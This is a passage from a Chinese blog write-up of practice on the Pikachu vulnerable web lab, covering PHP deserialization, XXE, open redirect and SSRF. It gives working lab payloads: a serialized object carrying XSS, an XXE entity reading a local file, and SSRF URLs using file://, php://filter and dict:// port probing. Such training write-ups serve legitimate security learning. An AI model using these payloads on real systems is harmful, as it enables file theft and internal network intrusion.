+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">常见的几个魔法函数:</span><br><span class="line">	__construct()当一个对象创建时被调用</span><br><span class="line"></span><br><span class="line">	__destruct()当一个对象销毁时被调用</span><br><span class="line"></span><br><span class="line">	__toString()当一个对象被当作一个字符串使用</span><br><span class="line"></span><br><span class="line">	__sleep() 在对象在被序列化之前运行</span><br><span class="line"></span><br><span class="line">	__wakeup将在序列化之后立即被调用</span><br><span class="line"></span><br><span class="line">漏洞举例:</span><br><span class="line"></span><br><span class="line">	class S&#123;</span><br><span class="line">		var $test = &quot;pikachu&quot;;</span><br><span class="line">		function __destruct()&#123;</span><br><span class="line">			echo $this-&gt;test;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	$s = $_GET[&#x27;test&#x27;];</span><br><span class="line">	@$unser = unserialize($a);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	payload:O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="0x14-XXE"><a href="#0x14-XXE" class="headerlink" title="0x14 XXE"></a>0x14 XXE</h2><h3 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h3><p>前端将<code>$_POST[&#39;xml&#39;]</code>传递给变量<code>$xml,</code> 由于后台没有对此变量进行安全判断就直接使用<code>simplexml_load_string</code>函数进行xml解析, 从而导致xxe漏洞</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 打印hello world --&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">    &lt;!ENTITY test &quot;hello world&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;name&gt;&amp;test;&lt;/name&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!-- 读取D盘根目录下的a.txt --&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE ANY[  </span><br><span class="line">	&lt;!ENTITY f SYSTEM &quot;file:///D:/a.txt&quot;&gt; </span><br><span class="line">]&gt; </span><br><span class="line">&lt;x&gt;&amp;f;&lt;/x&gt;</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="0x15-URL重定向"><a href="#0x15-URL重定向" class="headerlink" title="0x15 URL重定向"></a>0x15 URL重定向</h2><h3 id="不安全的url跳转"><a href="#不安全的url跳转" class="headerlink" title="不安全的url跳转"></a>不安全的url跳转</h3><p>修改url&#x3D;后面的参数</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/vul/urlredirect/urlredirect.php?url=https://baidu.com</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="0x16-SSRF"><a href="#0x16-SSRF" class="headerlink" title="0x16 SSRF"></a>0x16 SSRF</h2><ul>
+<li>curl 支持更多协议，有http、https、ftp、gopher、telnet、dict、file、ldap；模拟 Cookie 登录，爬取网页；FTP 上传下载。</li>
+<li>fopen &#x2F; file_get_contents 只能使用 GET 方式获取数据</li>
+</ul>
+<p>SSRF漏洞常用协议：</p>
+<h3 id="SSRF-curl"><a href="#SSRF-curl" class="headerlink" title="SSRF(curl)"></a>SSRF(curl)</h3><p>通过url参数直接访问内部资源，或者跳转到其他服务器页面</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HTTP(s):最常用到的一种协议，可以用来验证是否存在SSRF漏洞，探测端口以及服务。</span><br><span class="line">file：本地文件传输协议，可以用来读取任意系统文件</span><br><span class="line">dict:字典服务器协议，dict是基于查询相应的TCP协议，服务器监听端口2628。在SSRF漏洞中可用于探测端口以及攻击内网应用</span><br><span class="line">ghoper:互联网上使用的分布型的文件搜集获取网络协议，出现在http协议之前。可用于攻击内网应用，可用于反弹shell。</span><br></pre></td></tr></table></figure></div>
+
+<p>例：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//访问内网链接资源</span><br><span class="line">http://127.0.0.1/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1/vul/ssrf/ssrf_info/info2.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//读取D盘根目录a.txt</span><br><span class="line">http://127.0.0.1/vul/ssrf/ssrf_curl.php?url=file:///D:/a.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//用dict扫描内网主机开放的端口，端口存在时显示不同的信息</span><br><span class="line">dict://192.168.1.66:80</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="SSRF-file-get-content"><a href="#SSRF-file-get-content" class="headerlink" title="SSRF(file_get_content)"></a>SSRF(file_get_content)</h3><p>利用file_get_content(“path”)利用传递的参数，通过file参数访问内部资源，或者跳转到其他服务器页面</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//直接读取内部文件</span><br><span class="line">http://127.0.0.1/vul/ssrf/ssrf_fgc.php?file=D:/a.txt</span><br></pre></td></tr></table></figure></div>
+
+<p>php伪协议读取文件</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=D:/a.txt</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://s1.vika.cn/space/2023/08/12/fac52ef62e274aa49b4bc8e7eb36df6f"
+                      alt="SSRF1"
+                ></p>
+<ul>
+<li><strong>Title:</strong> Pikachu练习记录</li>
+</ul>
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> Pikachu练习记录</li>
+        <li><strong>作者:</strong> atdunbg</li>
+        <li><strong>创建于
+                :</strong> 2023-08-10 15:06:00</li>
+        
+            <li>
+                <strong>更新于
+                    :</strong> 2025-12-26 03:22:59
+            </li>
+        
+        <li>
+            <strong>链接:</strong> https://atdunbg.xyz/2023/08/10/pikachu_practice/
+        </li>
+        <li>
+            <strong>
+                版权声明:
+            </strong>
+            
+
+            
+                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/Pikachu/">#Pikachu</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/%E9%9D%B6%E5%9C%BA/">#靶场</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">#网络安全</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+  <div class="recommended-article px-2 sm:px-6 md:px-8">
+   <div class="recommended-desktop">
+    <div class="recommended-article-header text-xl md:text-3xl font-bold mt-10">
+     <i aria-hidden="true"></i><span>推荐阅读</span>
+    </div>
+    <div class="recommended-article-group"><a class="recommended-article-item" href="/2023/03/19/cloud_linux_1/" title="云计算 - Linux用户基础" rel="bookmark">
+  <img src="https://hexoimage.pages.dev/file/2369b0203a6961af7cd62.jpg" alt="云计算 - Linux用户基础" class="!max-w-none">
+  <span class="title">云计算 - Linux用户基础</span>
+</a><a class="recommended-article-item" href="/2023/04/27/cloud_linux_3/" title="云计算 - Linux服务与安全" rel="bookmark">
+  <img src="https://hexoimage.pages.dev/file/2369b0203a6961af7cd62.jpg" alt="云计算 - Linux服务与安全" class="!max-w-none">
+  <span class="title">云计算 - Linux服务与安全</span>
+</a><a class="recommended-article-item" href="/2022/11/23/c_learn_3/" title="C语言-3" rel="bookmark">
+  <img src="https://t.alcy.cc/fj" alt="C语言-3" class="!max-w-none">
+  <span class="title">C语言-3</span>
+</a></div>
+   </div>
+   <div class="recommended-mobile">
+   <div class="recommended-article-header text-xl md:text-3xl font-bold mt-10">
+     <i aria-hidden="true"></i><span>推荐阅读</span>
+   </div>
+   <div class="recommended-article-group"><a class="recommended-article-item" href="/2023/03/19/cloud_linux_1/" title="云计算 - Linux用户基础" rel="bookmark">
+  <img src="https://hexoimage.pages.dev/file/2369b0203a6961af7cd62.jpg" alt="云计算 - Linux用户基础" class="!max-w-none">
+  <span class="title">云计算 - Linux用户基础</span>
+</a><a class="recommended-article-item" href="/2023/04/27/cloud_linux_3/" title="云计算 - Linux服务与安全" rel="bookmark">
+  <img src="https://hexoimage.pages.dev/file/2369b0203a6961af7cd62.jpg" alt="云计算 - Linux服务与安全" class="!max-w-none">
+  <span class="title">云计算 - Linux服务与安全</span>
+</a></div>
+   </div>
+  </div>
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2025/11/16/aliyun-server-problem/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">关于服务器BPS/IOPS过高问题解决</span>
+						<span class="post-nav-item">上一篇</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2023/05/18/cloud_linux_5/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">云计算 - Linux集群</span>
+						<span class="post-nav-item">下一篇</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        评论
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://hexo-waline.atdunbg.xyz',
+          dark: 'body[class~="dark-mode"]',
+          reaction: true,
+          requiredMeta: ['nick', 'mail'],
+          emoji: ['https://unpkg.com/@waline/emojis@1.2.0/bilibili', 'https://unpkg.com/@waline/emojis@1.2.0/soul-emoji', 'https://unpkg.com/@waline/emojis@1.2.0/qq'],
+                    lang: 'zh-CN',
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">目录</div>
+		<div class="page-title">Pikachu练习记录</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Pikachu%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95"><span class="nav-text">Pikachu练习记录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-Pikachu%E9%9D%B6%E5%9C%BA"><span class="nav-text">0x01 Pikachu靶场</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="nav-text">0x02 暴力破解</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="nav-text">基于表单的暴力破解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88on-server%EF%BC%89"><span class="nav-text">验证码绕过（on server）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88on-client%EF%BC%89"><span class="nav-text">验证码绕过（on client）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Token%E9%98%B2%E7%88%86%E7%A0%B4%EF%BC%9F"><span class="nav-text">Token防爆破？</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-Cross-Site-Scripting"><span class="nav-text">0x03 Cross-Site Scripting</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8Bxss%EF%BC%88get%EF%BC%89"><span class="nav-text">反射型xss（get）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8Bxss%EF%BC%88post%EF%BC%89"><span class="nav-text">反射型xss（post）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8Bxss"><span class="nav-text">存储型xss</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DOM%E5%9E%8Bxss"><span class="nav-text">DOM型xss</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DOM%E5%9E%8Bxss-x"><span class="nav-text">DOM型xss-x</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#xss%E4%B9%8B%E7%9B%B2%E6%89%93"><span class="nav-text">xss之盲打</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#xss%E4%B9%8B%E8%BF%87%E6%BB%A4"><span class="nav-text">xss之过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#xss%E4%B9%8Bhtmlspecialchars"><span class="nav-text">xss之htmlspecialchars</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#xss%E4%B9%8Bhref%E8%BE%93%E5%87%BA"><span class="nav-text">xss之href输出</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#xss%E4%B9%8Bjs%E8%BE%93%E5%87%BA"><span class="nav-text">xss之js输出</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-CSRF"><span class="nav-text">0x04 CSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CSRF-get"><span class="nav-text">CSRF(get)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSRF-post"><span class="nav-text">CSRF(post)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSRF-token"><span class="nav-text">CSRF(token)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-Sql-Inject"><span class="nav-text">0x05 Sql Inject</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-text">数字型注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-text">字符型注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%90%9C%E7%B4%A2%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-text">搜索型注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#xx%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-text">xx型注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E2%80%9Cinsert-update%E2%80%9D%E6%B3%A8%E5%85%A5"><span class="nav-text">“insert&#x2F;update”注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E2%80%9Cdelete%E2%80%9D%E6%B3%A8%E5%85%A5"><span class="nav-text">“delete”注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E2%80%9Chttp-header%E2%80%9D%E6%B3%A8%E5%85%A5"><span class="nav-text">“http header”注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B2%E6%B3%A8%EF%BC%88base-on-boolean%EF%BC%89"><span class="nav-text">盲注（base on boolean）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B2%E6%B3%A8%EF%BC%88base-on-time%EF%BC%89"><span class="nav-text">盲注（base on time）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="nav-text">宽字节注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-RCE"><span class="nav-text">0x06 RCE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exec%E2%80%9Dping%E2%80%9D"><span class="nav-text">exec”ping”</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exec%E2%80%9Deval%E2%80%9D"><span class="nav-text">exec”eval”</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-File-Inclusion"><span class="nav-text">0x07 File Inclusion</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#file-inclusion-local"><span class="nav-text">file inclusion(local)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#file-inclusion-remote"><span class="nav-text">file inclusion(remote)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08-Unsafe-file-download"><span class="nav-text">0x08 Unsafe file download</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Unsafe-file-download"><span class="nav-text">Unsafe file download</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x09-unsafe-upfileupload"><span class="nav-text">0x09 [unsafe upfileupload]</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#client-check"><span class="nav-text">client check</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MIME-type"><span class="nav-text">MIME type</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#getimagesize"><span class="nav-text">getimagesize()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x10-over-permission"><span class="nav-text">0x10 over permission</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83"><span class="nav-text">水平越权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83"><span class="nav-text">垂直越权</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x11-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="nav-text">0x11 ..&#x2F;..&#x2F;(目录遍历)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="nav-text">目录遍历</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x12-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="nav-text">0x12 敏感信息泄露</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#icanyourABC"><span class="nav-text">icanyourABC</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x13-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">0x13 php反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="nav-text">php反序列化漏洞</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x14-XXE"><span class="nav-text">0x14 XXE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#XXE%E6%BC%8F%E6%B4%9E"><span class="nav-text">XXE漏洞</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x15-URL%E9%87%8D%E5%AE%9A%E5%90%91"><span class="nav-text">0x15 URL重定向</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84url%E8%B7%B3%E8%BD%AC"><span class="nav-text">不安全的url跳转</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x16-SSRF"><span class="nav-text">0x16 SSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SSRF-curl"><span class="nav-text">SSRF(curl)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSRF-file-get-content"><span class="nav-text">SSRF(file_get_content)</span></a></li></ol></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">atdunbg</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        共撰写了 17 篇文章
+                    </span>
+                    
+                        <span>
+                            共 48.8k 字
+                        </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">访问人数</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">总访问量</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
+            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
+        </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+            
+                
+        
+                
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+	<div class="search-pop-overlay">
+	<div class="popup search-popup">
+		<div class="search-header">
+			<span class="search-input-field-pre">
+				<i class="fa-solid fa-keyboard"></i>
+			</span>
+			<div class="search-input-container">
+				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="站内搜索您需要的内容..." spellcheck="false" type="search" class="search-input">
+			</div>
+			<span class="popup-btn-close">
+				<i class="fa-solid fa-times"></i>
+			</span>
+		</div>
+		<div id="search-result">
+			<div id="no-result">
+				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+			</div>
+		</div>
+	</div>
+</div>
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/build/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
